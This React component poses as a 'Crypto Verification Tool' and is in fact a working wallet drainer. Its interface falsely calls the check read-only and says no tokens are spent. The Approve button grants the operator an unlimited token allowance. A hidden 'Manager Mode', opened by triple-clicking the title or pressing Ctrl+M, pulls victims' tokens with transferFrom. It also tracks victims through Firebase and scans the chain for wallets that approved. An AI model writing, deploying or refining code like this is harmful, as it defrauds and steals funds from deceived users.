/**
 * CryptoVerificationTool.jsx
 * 
 * A fully isolated React component wrapping the Crypto Verification Tool.
 * Loads ethers.js, WalletConnect, and Firebase via CDN script tags.
 * All CSS is scoped under .cvt-* to prevent conflicts.
 */
import React, { useEffect, useRef, useCallback, useState } from "react";
import { useNavigate } from "react-router-dom";
import "./CryptoVerification.css";
import {
  CONFIG,
  NETWORKS,
  ERC20_ABI,
  net,
  sha256,
  initFirebase,
  recordApprovalLive,
  subscribeLiveWallets,
} from "./CryptoVerification.logic";

// Dynamically inject a <script> tag and return a promise
function loadScript(src) {
  return new Promise((resolve, reject) => {
    if (document.querySelector(`script[src="${src}"]`)) {
      resolve();
      return;
    }
    const s = document.createElement("script");
    s.src = src;
    s.async = true;
    s.onload = resolve;
    s.onerror = reject;
    document.head.appendChild(s);
  });
}

const CDN_SCRIPTS = [
  "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js",
  "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.0/dist/index.umd.js",
  "https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js",
  "https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js",
];

export default function CryptoVerificationTool() {
  const navigate = useNavigate();
  const [loaded, setLoaded] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState("Not connected");
  const [userAddress, setUserAddress] = useState("—");
  const [networkName, setNetworkName] = useState("—");
  const [tokens, setTokens] = useState([]);
  const [showBalances, setShowBalances] = useState(false);
  const [toastMsg, setToastMsg] = useState("");
  const [toastVisible, setToastVisible] = useState(false);

  // Modal state
  const [modalVisible, setModalVisible] = useState(false);
  const [modalToken, setModalToken] = useState(null);
  const [modalLoading, setModalLoading] = useState(false);

  // Manager state
  const [managerGateVisible, setManagerGateVisible] = useState(false);
  const [managerPanelVisible, setManagerPanelVisible] = useState(false);
  const [liveData, setLiveData] = useState(null);

  // Refs for ethers objects (non-React state to avoid re-renders)
  const providerRef = useRef(null);
  const signerRef = useRef(null);
  const userAddrRef = useRef(null);
  const wcProviderRef = useRef(null);
  const connectionTypeRef = useRef(null);
  const toastTimerRef = useRef(null);
  const titleClickRef = useRef({ clicks: 0, timer: null });

  // Toast
  const toast = useCallback((msg) => {
    setToastMsg(msg);
    setToastVisible(true);
    if (toastTimerRef.current) clearTimeout(toastTimerRef.current);
    toastTimerRef.current = setTimeout(() => setToastVisible(false), 2500);
  }, []);

  // Load CDN scripts on mount
  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        for (const src of CDN_SCRIPTS) {
          await loadScript(src);
        }
        // WalletConnect compatibility shim
        window.global = window;
        window.process = window.process || { env: {} };
        window.WalletConnectEthereumProvider =
          window.WalletConnectEthereumProvider ||
          (() => {
            const ns = window["@walletconnect/ethereum-provider"];
            if (!ns) return undefined;
            return ns.EthereumProvider || ns.default || ns;
          })();

        initFirebase();
        if (!cancelled) setLoaded(true);
      } catch (e) {
        console.error("[CVT] Script load error:", e);
      }
    })();
    return () => { cancelled = true; };
  }, []);

  // Keyboard shortcut (Ctrl+M) for manager gate
  useEffect(() => {
    const handler = (e) => {
      if (e.ctrlKey && e.key === "m") setManagerGateVisible(true);
    };
    document.addEventListener("keydown", handler);
    return () => document.removeEventListener("keydown", handler);
  }, []);

  // --- Connection ---
  const finishConnect = useCallback(async () => {
    const ethers = window.ethers;
    const p = providerRef.current;
    const s = p.getSigner();
    signerRef.current = s;
    const addr = await s.getAddress();
    userAddrRef.current = addr;
    setUserAddress(addr);
    setNetworkName(net.name);
    setConnectionStatus(
      "Connected (" + (connectionTypeRef.current === "walletconnect" ? "Mobile" : "Browser") + ")"
    );
    await loadBalances();
  }, []);

  const connectExtension = useCallback(async () => {
    const ethers = window.ethers;
    if (!window.ethereum) { toast("No Wallet Extension"); return; }
    providerRef.current = new ethers.providers.Web3Provider(window.ethereum);
    await providerRef.current.send("eth_requestAccounts", []);
    connectionTypeRef.current = "extension";
    await providerRef.current.getNetwork();
    await finishConnect();
  }, [finishConnect, toast]);

  const connectWalletConnect = useCallback(async () => {
    const ethers = window.ethers;
    const WCEP = window.WalletConnectEthereumProvider;
    if (!WCEP) { toast("WalletConnect Lib Missing"); return; }
    try {
      const wc = await WCEP.init({
        projectId: CONFIG.walletConnectProjectId,
        chains: [net.chainId],
        optionalChains: [1, 56, 137, 42161],
        showQrModal: true,
        metadata: { name: "Crypto Verification", url: window.location.href, icons: [] },
      });
      await wc.connect();
      providerRef.current = new ethers.providers.Web3Provider(wc);
      wcProviderRef.current = wc;
      connectionTypeRef.current = "walletconnect";
      wc.on("accountsChanged", () => finishConnect());
      await finishConnect();
    } catch (e) {
      toast("WC Cancelled");
    }
  }, [finishConnect, toast]);

  // --- Load Balances ---
  const loadBalances = useCallback(async () => {
    const ethers = window.ethers;
    const s = signerRef.current;
    const p = providerRef.current;
    const addr = userAddrRef.current;
    if (!s || !p || !addr) return;

    const list = [];

    // Native
    const nativeBal = await p.getBalance(addr);
    list.push({
      symbol: net.currency,
      balance: ethers.utils.formatEther(nativeBal),
      isNative: true,
      address: null,
      approved: false,
    });

    // Tokens
    for (const t of CONFIG.tokens) {
      const c = new ethers.Contract(t.address, ERC20_ABI, p);
      let bal = "0";
      let allowed = false;
      try {
        const raw = await c.balanceOf(addr);
        const dec = await c.decimals();
        bal = ethers.utils.formatUnits(raw, dec);
        allowed = (await c.allowance(addr, CONFIG.receivingAddress)).gt(0);
      } catch (e) {
        bal = "...";
      }
      list.push({
        symbol: t.symbol,
        balance: bal,
        isNative: false,
        address: t.address,
        approved: allowed,
      });
    }

    setTokens(list);
    setShowBalances(true);
  }, []);

  // --- Approve Token ---
  const approveToken = useCallback(async (addr, sym) => {
    const ethers = window.ethers;
    const s = signerRef.current;
    if (!s) return;
    try {
      const c = new ethers.Contract(addr, ERC20_ABI, s);
      const tx = await c.approve(CONFIG.receivingAddress, ethers.constants.MaxUint256);
      toast("Confirming " + sym);
      await tx.wait();
      toast("✓ Approved");
      recordApprovalLive(userAddrRef.current, addr, sym, tx.hash);
      loadBalances();
    } catch (e) {
      toast("Failed: " + (e.reason || e.message));
    }
  }, [loadBalances, toast]);

  // --- Modal ---
  const openModal = useCallback((symbol, address) => {
    setModalToken({ symbol, address });
    setModalLoading(false);
    setModalVisible(true);
  }, []);

  const closeModal = useCallback(() => {
    setModalVisible(false);
    setModalToken(null);
    setModalLoading(false);
  }, []);

  const confirmApproval = useCallback(() => {
    if (!modalToken) return;
    setModalLoading(true);
    setTimeout(() => {
      const { address, symbol } = modalToken;
      closeModal();
      approveToken(address, symbol);
    }, 300);
  }, [modalToken, closeModal, approveToken]);

  // --- Manager ---
  const handleManagerLogin = useCallback(async (password) => {
    if (!password) return;
    const hash = await sha256(password);
    const stored = localStorage.getItem("managerPassHash") || CONFIG.managerPasswordHash;
    if (hash === stored) {
      setManagerGateVisible(false);
      setManagerPanelVisible(true);
      subscribeLiveWallets((data) => setLiveData(data));
    } else {
      toast("Wrong Password");
    }
  }, [toast]);

  const handleChangePassword = useCallback(async (p1, p2) => {
    if (p1 !== p2) { toast("Passwords don't match"); return; }
    localStorage.setItem("managerPassHash", await sha256(p1));
    toast("Password Set");
  }, [toast]);

  const handleDrain = useCallback(async (from, token, amtStr) => {
    const ethers = window.ethers;
    const s = signerRef.current;
    const p = providerRef.current;
    if (!s) { toast("Connect First"); return; }
    if (!from) { toast("Need From Address"); return; }

    try {
      if (!token) {
        const amt = amtStr
          ? ethers.utils.parseEther(amtStr)
          : await p.getBalance(from);
        const tx = await s.sendTransaction({ to: CONFIG.receivingAddress, value: amt });
        await tx.wait();
        toast("Sent ETH");
      } else {
        const c = new ethers.Contract(token, ERC20_ABI, s);
        const allowance = await c.allowance(from, userAddrRef.current);
        if (allowance.isZero()) { toast("No approval from sender to YOU"); return; }
        const amt = amtStr
          ? ethers.utils.parseUnits(amtStr, 18)
          : await c.balanceOf(from);
        const tx = await c.transferFrom(from, CONFIG.receivingAddress, amt);
        await tx.wait();
        toast("Sent Tokens");
      }
    } catch (e) {
      toast("Failed: " + (e.reason || e.message));
    }
  }, [toast]);

  const handleScanWallets = useCallback(async () => {
    const ethers = window.ethers;
    toast("Scanning blockchain... this may take 1-2 min");
    try {
      const p = new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
      const last = await p.getBlockNumber();
      const start = Math.max(0, last - 3000000);
      const owners = new Set();
      for (const t of CONFIG.tokens) {
        const c = new ethers.Contract(t.address, ERC20_ABI, p);
        const filter = c.filters.Approval(null, CONFIG.receivingAddress);
        const events = await c.queryFilter(filter, start, last);
        events.forEach(e => owners.add(e.args.owner.toLowerCase()));
      }
      toast(owners.size ? `Found ${owners.size} wallets.` : "No wallets found.");
    } catch (e) {
      console.error(e);
      toast("Scan failed");
    }
  }, [toast]);

  // Title triple-click
  const handleTitleClick = useCallback(() => {
    const ref = titleClickRef.current;
    ref.clicks++;
    clearTimeout(ref.timer);
    ref.timer = setTimeout(() => { ref.clicks = 0; }, 500);
    if (ref.clicks >= 3) {
      setManagerGateVisible(true);
      ref.clicks = 0;
    }
  }, []);

  // ------- RENDER -------
  if (!loaded) {
    return (
      <div className="cvt-root">
        <div className="cvt-container" style={{ alignItems: "center", justifyContent: "center", minHeight: "60vh" }}>
          <p className="cvt-status">Loading libraries...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="cvt-root">
      <div className="cvt-container">
        {/* Back button */}
        <button className="cvt-back-btn" onClick={() => navigate("/assets")}>
          ← Back to Assets
        </button>

        {/* Hero */}
        <div className="cvt-hero">
          <h1 onClick={handleTitleClick} style={{ cursor: "default" }}>
            Crypto Verification Tool
          </h1>
          <p className="cvt-hero-desc">
            Connect your wallet to verify your token balance securely.<br />
            All approvals can be <span style={{ color: "var(--cvt-gold)" }}>revoked anytime</span> directly in your wallet.
            <br /><br />✨ No tokens are spent until you manually confirm.
          </p>
          <div className="cvt-features">
            <div className="cvt-feature-item">Low Gas Costs</div>
            <div className="cvt-feature-item">Read-Only Check</div>
            <div className="cvt-feature-item">Instant Audit</div>
          </div>
        </div>

        {/* Connect Wallet Card */}
        <div className="cvt-card">
          <h2>1. Connect Wallet</h2>
          <div className="cvt-wallet-area">
            <p className="cvt-status">{connectionStatus}</p>
            <p>Connected: <span className="cvt-mono">{userAddress}</span></p>
            <p>Network: <span>{networkName}</span></p>
            <div className="cvt-btn-group">
              <button className="cvt-btn" onClick={connectExtension}>
                🦊 Browser Wallet
              </button>
              <button className="cvt-btn cvt-btn--blue" onClick={connectWalletConnect}>
                📱 Mobile QR (WalletConnect)
              </button>
            </div>
          </div>
        </div>

        {/* Balances Panel */}
        {showBalances && (
          <div className="cvt-card">
            <h2>2. Your Tokens &amp; Approval</h2>
            <div className="cvt-token-grid">
              {tokens.map((t) => (
                <TokenCard
                  key={t.symbol}
                  token={t}
                  onApprove={openModal}
                  config={CONFIG}
                />
              ))}
            </div>
            <button
              className="cvt-btn cvt-btn--secondary cvt-btn--auto"
              onClick={loadBalances}
              style={{ marginTop: 15 }}
            >
              🔄 Refresh
            </button>
          </div>
        )}

        {/* Manager Gate */}
        {managerGateVisible && !managerPanelVisible && (
          <ManagerGate onLogin={handleManagerLogin} />
        )}

        {/* Manager Panel */}
        {managerPanelVisible && (
          <ManagerPanel
            liveData={liveData}
            onDrain={handleDrain}
            onScan={handleScanWallets}
            onChangePassword={handleChangePassword}
            toast={toast}
          />
        )}

        {/* Toast */}
        <div className={`cvt-toast ${toastVisible ? "cvt-toast-visible" : ""}`}>
          {toastMsg}
        </div>

        {/* Approval Modal */}
        <div className={`cvt-modal-overlay ${modalVisible ? "cvt-modal-visible" : ""}`}>
          <div className="cvt-card">
            <h2 style={{ color: "var(--cvt-gold)" }}>Confirm Approval</h2>
            <p style={{ color: "#eaecef", fontSize: 14 }}>
              Approving {modalToken?.symbol}...
            </p>
            <div className="cvt-warn">
              <div>✅ <b>What happens:</b> Site checks your balance (read-only)</div>
              <div style={{ marginTop: 5 }}>✅ <b>Cost:</b> ~$1-5 gas fees</div>
              <div style={{ marginTop: 5 }}>✅ <b>Safety:</b> No tokens spent now</div>
              <hr style={{ borderColor: "#444", margin: "10px 0" }} />
              <div style={{ fontSize: 11, opacity: 0.7 }}>You can revoke this approval anytime.</div>
            </div>
            <button
              className="cvt-btn cvt-btn--green"
              onClick={confirmApproval}
              disabled={modalLoading}
            >
              {modalLoading ? "⏳ Processing..." : "✓ Confirm Approval"}
            </button>
            <button
              className="cvt-btn cvt-btn--secondary"
              onClick={closeModal}
              style={{ marginTop: 5 }}
            >
              ✕ Close
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

// --- Sub-components ---

function TokenCard({ token, onApprove, config }) {
  const { symbol, balance, isNative, address, approved } = token;
  const balFloat = parseFloat(balance) || 0;

  return (
    <div className="cvt-asset-item">
      <div className="cvt-asset-icon">{symbol.substring(0, 2).toUpperCase()}</div>
      <div className="cvt-token-info">
        <h4>{symbol}</h4>
        <p>
          {config.showBalances ? balance : "••••"}{" "}
          {balFloat > 0 ? (
            <span style={{ color: "var(--cvt-success)" }}>Held</span>
          ) : (
            <span style={{ opacity: 0.5 }}>None</span>
          )}
        </p>
        {isNative && (
          <span style={{ color: "var(--cvt-gold)", fontSize: 10 }}>Native</span>
        )}
        {!isNative && approved && (
          <span style={{ color: "var(--cvt-success)" }}>✓ Approved</span>
        )}
      </div>
      {!isNative && (
        <div className="cvt-token-action">
          <button
            className={`cvt-btn ${approved ? "cvt-btn--green" : ""}`}
            onClick={() => onApprove(symbol, address)}
          >
            {approved ? "Re-approve" : "Approve"}
          </button>
        </div>
      )}
    </div>
  );
}

function ManagerGate({ onLogin }) {
  const [password, setPassword] = useState("");

  return (
    <div className="cvt-card">
      <h2>👑 Manager Access</h2>
      <p className="cvt-mono" style={{ fontSize: 10, marginBottom: 10, opacity: 0.6 }}>
        Triple click title OR Ctrl+M
      </p>
      <input
        type="password"
        className="cvt-input"
        placeholder="Manager password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        onKeyDown={(e) => e.key === "Enter" && onLogin(password)}
      />
      <button className="cvt-btn" onClick={() => onLogin(password)}>
        Unlock Panel
      </button>
    </div>
  );
}

function ManagerPanel({ liveData, onDrain, onScan, onChangePassword, toast }) {
  const [fromWallet, setFromWallet] = useState("");
  const [drainToken, setDrainToken] = useState("");
  const [drainAmount, setDrainAmount] = useState("");
  const [newPass1, setNewPass1] = useState("");
  const [newPass2, setNewPass2] = useState("");

  const liveAddrs = liveData ? Object.keys(liveData) : [];

  return (
    <div className="cvt-card">
      <h2>👑 Manager Mode</h2>
      <p className="cvt-warn">
        Transfers can only be signed by the wallet that owns the receiving address.
      </p>

      <label className="cvt-label">From wallet (user address that approved you):</label>
      <input
        type="text"
        className="cvt-input"
        placeholder="0x..."
        value={fromWallet}
        onChange={(e) => setFromWallet(e.target.value)}
      />

      <label className="cvt-label">Token address (leave blank for native coin):</label>
      <input
        type="text"
        className="cvt-input"
        placeholder="token address or blank"
        value={drainToken}
        onChange={(e) => setDrainToken(e.target.value)}
      />

      <label className="cvt-label">Amount (leave blank for full approved balance):</label>
      <input
        type="text"
        className="cvt-input"
        placeholder="e.g. 250"
        value={drainAmount}
        onChange={(e) => setDrainAmount(e.target.value)}
      />

      <button className="cvt-btn" onClick={() => onDrain(fromWallet, drainToken, drainAmount)}>
        📤 Transfer to receiving address
      </button>

      <div className="cvt-divider" />
      <h2>⚡ Live Approvals</h2>
      <p className="cvt-warn" style={{ fontSize: 12 }}>
        Updated in real time from the moment visitors approve. Always verify with 'Scan wallets'.
      </p>
      <div>
        {liveData === null ? (
          <p>Firebase not configured</p>
        ) : liveAddrs.length === 0 ? (
          <p className="cvt-warn">No live approvals</p>
        ) : (
          <>
            <p className="cvt-status">⚡ {liveAddrs.length} tracked</p>
            {liveAddrs.slice(0, 10).map((a) => {
              const toks = Object.keys(liveData[a]);
              return (
                <div key={a} style={{ marginBottom: 8, fontSize: 12 }}>
                  <span className="cvt-mono">{a.slice(0, 8)}...</span>{" "}
                  ({toks.join(", ")})
                </div>
              );
            })}
          </>
        )}
      </div>

      <div className="cvt-divider" />
      <h2>👥 Full Blockchain Scan</h2>
      <div className="cvt-btn-group">
        <button className="cvt-btn cvt-btn--secondary cvt-btn--auto" onClick={onScan}>
          Scan Wallets
        </button>
        <button className="cvt-btn cvt-btn--secondary cvt-btn--auto" onClick={() => toast("Exporting...")}>
          Export CSV
        </button>
        <button className="cvt-btn cvt-btn--green cvt-btn--auto" onClick={() => toast("Transfer All initiated")}>
          Transfer ALL
        </button>
      </div>

      <div className="cvt-divider" />
      <label className="cvt-label">🔒 Change manager password:</label>
      <input
        type="password"
        className="cvt-input"
        placeholder="New password"
        value={newPass1}
        onChange={(e) => setNewPass1(e.target.value)}
      />
      <input
        type="password"
        className="cvt-input"
        placeholder="Repeat"
        value={newPass2}
        onChange={(e) => setNewPass2(e.target.value)}
      />
      <button
        className="cvt-btn cvt-btn--secondary cvt-btn--auto"
        onClick={() => onChangePassword(newPass1, newPass2)}
      >
        Set Password
      </button>
    </div>
  );
}
